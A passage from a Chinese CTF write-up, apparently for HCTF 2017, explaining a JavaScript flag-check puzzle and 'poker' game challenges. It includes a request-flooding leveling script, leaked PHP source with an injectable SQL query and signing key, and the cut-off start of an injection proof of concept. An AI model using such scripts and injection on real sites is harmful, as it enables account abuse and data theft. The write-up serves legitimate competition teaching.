        function u<span class="token punctuation">(</span>str<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>
            var result <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span><span class="token punctuation">(</span>var i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>j<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                result <span class="token operator">+</span><span class="token operator">=</span> str<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> result<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>m <span class="token operator">||</span> u<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">false</span>
        <span class="token punctuation">}</span>

        o <span class="token operator">=</span> s2h<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> o <span class="token operator">&amp;&amp;</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> u<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre><p>&#x5269;&#x4E0B;&#x7684;&#x4EE3;&#x7801;&#x5DF2;&#x7ECF;&#x6CA1;&#x4EC0;&#x4E48;&#x53EF;&#x8BF4;&#x7684;&#x4E86;&#x3002;</p> <ul> <li>1&#x3001;&#x9996;&#x5148;&#x662F;&#x786E;&#x8BA4;flag&#x524D;&#x7F00;&#xFF0C;&#x7136;&#x540E;&#x6309;&#x7167;<code>_</code>&#x5206;&#x5272;&#x4E3A;5&#x90E8;&#x5206;&#x3002; </li> <li>2&#x3001;g&#x51FD;&#x6570;&#x5BF9;&#x57FA;&#x7840;&#x6570;&#x7EC4;&#x505A;&#x4E86;&#x4E00;&#x4E9B;&#x5904;&#x7406;&#xFF0C;&#x5DF2;&#x7ECF;&#x6CA1;&#x4EC0;&#x4E48;&#x61C2;&#x4E86;&#x3002; </li> <li>3&#x3001;s2h&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x5230;hex&#x7684;&#x8F6C;&#x5316;&#x51FD;&#x6570; </li> <li>4&#x3001;&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x9A8C;&#x8BC1;&#x4E0D;&#x5B8C;&#x6574;&#xFF0C;&#x5BFC;&#x81F4;&#x4E25;&#x91CD;&#x7684;&#x591A;&#x89E3;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x7206;&#x7834;&#x662F;&#x5426;&#x7B26;&#x5408;sha256&#x6765;&#x89E3;&#x51B3;&#x3002; </li> <li>5&#x3001;&#x540E;&#x9762;&#x5F15;&#x5165;&#x7684;b2c&#x51FD;&#x6570;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x6D4B;&#x8BD5;&#x5C31;&#x80FD;&#x53D1;&#x73B0;&#x662F;&#x4E00;&#x4E2A;base32&#x51FD;&#x6570;&#x3002; </li> <li>6&#x3001;&#x7B2C;&#x4E09;&#x90E8;&#x5206;&#x548C;&#x7B2C;&#x56DB;&#x90E8;&#x5206;&#x6700;&#x7B80;&#x5355;&#xFF0C;&#x5F02;&#x6216;&#x53EF;&#x5F97; </li> <li>7&#x3001;h&#x51FD;&#x6570;&#x4F1A;&#x5BF9;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6BCF;&#x4F4D;&#x505A;func&#x51FD;&#x6570;&#x5904;&#x7406;&#xFF0C;&#x7136;&#x540E;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x3002; </li> <li>8&#x3001;&#x7B2C;&#x4E8C;&#x90E8;&#x5206;&#x7531;3&#x5206;&#x5272;&#xFF0C;&#x5DE6;&#x53F3;&#x4E24;&#x8FB9;&#x957F;&#x5EA6;&#x76F8;&#x7B49;&#xFF0C;&#x540C;&#x6837;&#x53EF;&#x4EE5;&#x63A8;&#x7B97;&#x51FA;&#x7ED3;&#x679C;&#x3002; </li> <li>9&#x3001;k&#x662F;&#x6211;&#x4E13;&#x95E8;&#x52A0;&#x5165;&#x7684;es6&#x8BED;&#x6CD5;&#x7684;&#x7BAD;&#x5934;&#x8BED;&#x6CD5;&#xFF0C;&#x5BF9;&#x4F20;&#x5165;&#x7684;&#x6BCF;&#x4E2A;&#x5B57;&#x6BCD;&#x505A;&#x4E58;7&#x64CD;&#x4F5C;&#x3002; </li> <li>10&#x3001;&#x6700;&#x540E;&#x4E00;&#x9898;&#x901A;&#x8FC7;&#x7B80;&#x5355;&#x7684;&#x5224;&#x65AD;&#xFF0C;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x6700;&#x540E;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x524D;&#x56DB;&#x4F4D;&#x3002; </li> <li>11&#x3001;u&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x6307;&#x5B9A;&#x524D;&#x51E0;&#x4F4D; </li> <li>12&#x3001;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x4E00;&#x8FDE;&#x4E32;&#x7684;&#x6761;&#x4EF6;: </li> <li>13&#x3001;&#x9996;&#x5148;&#x662F;&#x4E00;&#x4E9B;&#x5F88;&#x5173;&#x952E;&#x7684;&#x7684;&#x91CD;&#x590D;&#x4F4D;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x5199;&#x9519;&#x4E86;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#xFF0C;&#x5BFC;&#x81F4;&#x8FD9;&#x91CC;&#x6C38;&#x8FDC;&#x662F;false&#xFF0C;&#x540E;&#x88AB;&#x8FEB;&#x7ED9;&#x51FA;&#x8FD9;&#x51E0;&#x4F4D;.<code><span class="token operator">!</span>m <span class="token operator">||</span> u<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span></code> </li> <li>14&#x3001;&#x6700;&#x540E;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x96C6;&#x5408;&#x957F;&#x5EA6;&#x3001;&#x4EE5;&#x53CA;&#x90E8;&#x5206;&#x6761;&#x4EF6;&#x5B8C;&#x6210;&#x7684;&#xFF0C;&#x770B;&#x4E0A;&#x53BB;&#x5B58;&#x5728;&#x591A;&#x89E3;&#xFF0C;&#x4F46;&#x4E8B;&#x5B9E;&#x4E0A;&#x662F;&#x80FD;&#x9006;&#x5411;&#x51FA;&#x6765;&#x7ED3;&#x679C;&#x7684;&#x3002;</li> </ul> <p>&#x5F53;&#x6211;&#x4EEC;&#x90FD;&#x5B8C;&#x6210;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x65F6;&#x5019;&#xFF0C;flag&#x5C31;&#x4F1A;&#x88AB;&#x6211;&#x4EEC;&#x89E3;&#x51FA;&#x6765;&#x4E86;&#x3002;</p> <h3 id="poker">poker</h3> <p>&#x8FD9;&#x6B21;&#x60F3;&#x4EE5;&#x6E38;&#x620F;&#x5B89;&#x5168;&#x51FA;&#x4E00;&#x4E9B;&#x9898;&#x76EE;&#xFF0C;&#x4F46;&#x662F;&#x53C8;&#x62C5;&#x5FC3;&#x51FA;&#x7684;&#x592A;&#x96BE;&#xFF0C;&#x5927;&#x5BB6;&#x6CA1;&#x505A;&#x8FC7;&#x7C7B;&#x4F3C;&#x7684;&#x6E38;&#x620F;&#x6F0F;&#x6D1E;&#x6316;&#x6398;(&#x5176;&#x5B9E;&#x662F;&#x4E3A;&#x4E86;&#x5077;&#x61D2;)&#xFF0C;&#x5C31;&#x51FA;&#x4E86;&#x4E00;&#x9053;&#x6218;&#x6597;&#x9891;&#x7387;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x7684;&#x5237;&#x7EA7;&#x6F0F;&#x6D1E;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x53BB;&#x6389;&#x5145;&#x503C;&#x529F;&#x80FD;&#x4EE5;&#x5916;&#x5B8C;&#x6574;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x6211;&#x53BB;&#x6389;&#x4E86;&#x540E;&#x53F0;&#x5BF9;&#x4E8E;&#x52A0;&#x901F;&#x5668;&#x7684;&#x68C0;&#x6D4B;&#x673A;&#x5236;&#x3002;<br>&#x63D0;&#x793A;&#x7ED9;&#x7684;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x5728;flag.php&#x91CC;&#x63D0;&#x793A;&#x4E86;</p> <p><code>getFlag <span class="token keyword">when</span> you are at level <span class="token number">100</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span></code></p> <p>&#x5347;&#x5230;&#x4E00;&#x767E;&#x7EA7;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;&#x5230;flag&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8D5B;&#x65F6;&#x95F4;&#x7684;48&#x4E2A;&#x5C0F;&#x65F6;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x5403;&#x4E0D;&#x559D;&#x4E5F;&#x662F;&#x5347;&#x4E0D;&#x5230;100&#x7EA7;&#x7684;&#xFF0C;ctf&#x672C;&#x6765;&#x5C31;&#x662F;&#x4E00;&#x4E2A;hack game&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x5206;&#x6790;&#x4ED6;&#x7684;&#x6E38;&#x620F;&#x673A;&#x5236;&#x3002;&#x8FD9;&#x4E2A;&#x7248;&#x672C;&#x7684;poker2&#x6CA1;&#x6709;&#x6218;&#x6597;&#x9891;&#x7387;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x9AD8;&#x901F;&#x65E0;&#x9650;&#x6218;&#x6597;&#xFF0C;&#x811A;&#x672C;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x9700;&#x8981;&#x5206;&#x6790;&#x6E38;&#x620F;&#x7684;&#x7EC6;&#x8282;&#x3002;&#x4F17;&#x591A;&#x91CE;&#x602A;&#x5730;&#x56FE;&#x91CC;&#x6709;&#x4E00;&#x4E2A;&#x53EB;&#x5723;&#x8BDE;&#x5C0F;&#x5C4B;&#x7684;&#x6302;&#x673A;&#x5730;&#x56FE;&#xFF0C;&#x4F24;&#x5BB3;&#x4F4E;&#x7ECF;&#x9A8C;&#x9AD8;&#xFF0C;&#x5199;&#x597D;&#x6302;&#x673A;&#x811A;&#x672C;&#x8FD8;&#x662F;&#x5F88;&#x7B80;&#x5355;&#x7684;&#x3002;</p> <pre><code>    import requests
    import re
    from time import sleep
    host <span class="token operator">=</span> <span class="token string">&quot;petgame.2017.hctf.io&quot;</span>

    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Cookie&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;PHPSESSID=c4gn8hav06nsv43bo65tlfkto3&quot;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">getFight</span></span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://&quot;</span><span class="token operator">+</span>host<span class="token operator">+</span><span class="token string">&quot;/function/Fight_Mod.php?p=37&amp;bid=5226&amp;rd=0.5365947475076844&quot;</span>
        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>
        html <span class="token operator">=</span> req<span class="token punctuation">.</span>content
        gid <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&quot;gg=\[.*,(.*)\]&quot;</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>
        <span class="token keyword">if</span> len<span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
            gid <span class="token operator">=</span> gid<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            attack<span class="token punctuation">(</span>gid<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> headers<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token constant">False</span>

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">attack</span></span><span class="token punctuation">(</span>gid<span class="token punctuation">,</span> times<span class="token punctuation">,</span> host<span class="token punctuation">,</span> headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://&quot;</span><span class="token operator">+</span>host<span class="token operator">+</span><span class="token string">&quot;/function/FightGate.php?id=1&amp;g=&quot;</span><span class="token operator">+</span>str<span class="token punctuation">(</span>gid<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&amp;checkwg=checked&amp;rd=0.34966725314993186&quot;</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>times<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">)</span>
            html <span class="token operator">=</span> req<span class="token punctuation">.</span>content
            print html

    <span class="token keyword">while</span> <span class="token constant">True</span><span class="token punctuation">:</span>
        getFight<span class="token punctuation">(</span>host<span class="token punctuation">,</span>headers<span class="token punctuation">)</span>
    <span class="token comment">#    sleep(0.1)</span>

    <span class="token comment">#attack(86,url,headers)</span></code></pre><p>&#x5176;&#x5B9E;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x89E3;&#x6CD5;&#xFF0C;&#x5C31;&#x662F;&#x5728;poker-poker&#x4E00;&#x9898;&#x4E2D;&#x627E;&#x5230;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E00;&#x767E;&#x7EA7;&#x7684;&#x73A9;&#x5BB6;&#x7684;&#x5BC6;&#x7801;&#x662F;&#x5F31;&#x53E3;&#x4EE4;(md5&#x53EF;&#x67E5;)&#x5219;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x5176;&#x4ED6;&#x4EBA;&#x8D26;&#x53F7;&#x83B7;&#x5F97;flag&#x3002;&#x6211;&#x7279;&#x610F;&#x628A;poker2&#x4E00;&#x9898;&#x653E;&#x5728;&#x7B2C;&#x4E8C;&#x5C42;&#xFF0C;poker-poker&#x5728;&#x7B2C;&#x4E09;&#x5C42;&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x662F;&#x6709;&#x4EBA;&#x627E;&#x5230;&#x4E86;&#x975E;&#x9884;&#x671F;&#x7684;&#x6CE8;&#x5165;&#x70B9;(&#x6CE8;&#x518C;&#x5904;)&#xFF0C;&#x63D0;&#x524D;&#x83B7;&#x53D6;&#x4E86;&#x522B;&#x4EBA;&#x7684;session&#xFF0C;&#x5728;&#x6211;&#x5220;&#x9664;&#x4E00;&#x767E;&#x7EA7;&#x8D26;&#x53F7;&#x524D;&#x83B7;&#x5F97;flag&#x3002;</p> <h3 id="poker-poker">poker-poker</h3> <p>&#x8FD9;&#x9898;&#x5C31;&#x6BD4;&#x8F83;&#x96BE;&#x53D7;&#x4E86;&#xFF0C;&#x770B;&#x4E86;&#x5927;&#x5BB6;&#x4F20;&#x4E0A;&#x6765;&#x7684;wp&#xFF0C;&#x6CA1;&#x6709;&#x4E00;&#x4EFD;&#x662F;&#x9884;&#x671F;&#x89E3;&#x3002;&#x7531;&#x4E8E;&#x6E38;&#x620F;&#x7A0B;&#x5E8F;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x6211;&#x4E5F;&#x6CA1;&#x5168;&#x90E8;&#x770B;&#x8FC7;&#xFF0C;&#x5C31;&#x627E;&#x4E86;&#x4E00;&#x5904;&#x9690;&#x853D;&#x7684;&#x6709;&#x56DE;&#x663E;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E00;&#x4E9B;&#x524D;&#x7F6E;&#x6761;&#x4EF6;&#x3002;<br>&#x9898;&#x76EE;&#x63D0;&#x793A;&#x662F;pspt&#xFF0C;&#x8BBF;&#x95EE;&#x53D1;&#x73B0;&#x8DF3;&#x8F6C;&#x5230;pspt/&#x5E76;&#x4E14;&#x72B6;&#x6001;403&#xFF0C;&#x8BF4;&#x660E;&#x5B58;&#x5728;pspt&#x76EE;&#x5F55;&#x3002;<br>pspt&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;robots.txt&#x3002;</p> <pre><code>    <span class="token constant">Disallow</span><span class="token punctuation">:</span> <span class="token operator">/</span>pspt<span class="token operator">/</span>inf<span class="token operator">/</span>queryUserRole<span class="token punctuation">.</span>php
    <span class="token constant">Sitemap</span><span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>domain<span class="token punctuation">.</span>com<span class="token operator">/</span>sitemap<span class="token punctuation">.</span>xml</code></pre><p>&#x76F4;&#x63A5;&#x8BBF;&#x95EE;/pspt/inf/queryUserRole.php&#x63D0;&#x793A;error1&#x3002;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;.bak&#x6587;&#x4EF6;&#xFF0C;&#x6CC4;&#x6F0F;&#x4E86;&#x6E90;&#x7801;&#x3002;</p> <pre><code>    <span class="token operator">&lt;</span><span class="token operator">?</span>php
    require_once<span class="token punctuation">(</span>dirname<span class="token punctuation">(</span>dirname<span class="token punctuation">(</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">&apos;/config/config.game.php&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>empty<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;user_account&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> empty<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;valid_date&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> empty<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;sign&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        die<span class="token punctuation">(</span><span class="token string">&apos;error1&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$time</span> <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;valid_date&apos;</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token variable">$time</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        die<span class="token punctuation">(</span><span class="token string">&apos;error2&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$encryKey</span> <span class="token operator">=</span> <span class="token string">&apos;7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM&apos;</span><span class="token punctuation">;</span>
    <span class="token variable">$flag</span> <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;user_account&apos;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;valid_date&apos;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$encryKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$flag</span> <span class="token operator">!=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;sign&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        die<span class="token punctuation">(</span><span class="token string">&apos;error3&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token variable">$_pm</span><span class="token punctuation">[</span><span class="token string">&apos;mysql&apos;</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">&gt;</span> getOneRecord<span class="token punctuation">(</span><span class="token string">&quot;SELECT id,nickname FROM player WHERE name = &apos;{$_GET[&apos;user_account&apos;]}&apos;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>is_array<span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        die<span class="token punctuation">(</span><span class="token string">&apos;error4&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string">&apos;id&apos;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">&apos;&amp;&apos;</span><span class="token punctuation">.</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string">&apos;nickname&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$newstr</span> <span class="token operator">=</span> iconv<span class="token punctuation">(</span><span class="token string">&apos;utf8&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;utf-8&apos;</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    echo <span class="token variable">$newstr</span><span class="token punctuation">;</span>
    unset<span class="token punctuation">(</span><span class="token variable">$time</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">?</span><span class="token operator">&gt;</span></code></pre><p>&#x6B64;&#x5904;&#x6CC4;&#x6F0F;&#x4E86;encryKey&#xFF0C;&#x53EA;&#x8981;&#x6709;&#x8FD9;&#x4E2A;encryKey&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x6E90;&#x7801;&#x5199;&#x51FA;&#x6CE8;&#x5165;payload&#x3002;<br>poc:</p> <pre><code>    import requests
    import time
    import hashlib
    import urllib2

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">getMd5</span></span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> str<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        t <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        t<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">return</span> t<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">hack</span></span><span class="token punctuation">(</span>payload<span class="token operator">=</span><span class="token string">&quot;admin&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        user_account <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        valid_date <span class="token operator">=</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10000</span>
        sign <span class="token operator">=</span> getSign<span class="token punctuation">(</span>user_account<span class="token punctuation">,</span> valid_date<span class="token punctuation">)</span>
        url <span class="token operator">=</span> <span class="token string">&quot;http://petgame.2017.hctf.io/pspt/inf/queryUserRole.php?user_account=&quot;</span><span class="token operator">+</span>str<span class="token punctuation">(</span>user_account<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&amp;valid_date=&quot;</span><span class="token operator">+</span>str<span class="token punctuation">(</span>valid_date<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&amp;sign=&quot;</span><span class="token operator">+</span>sign
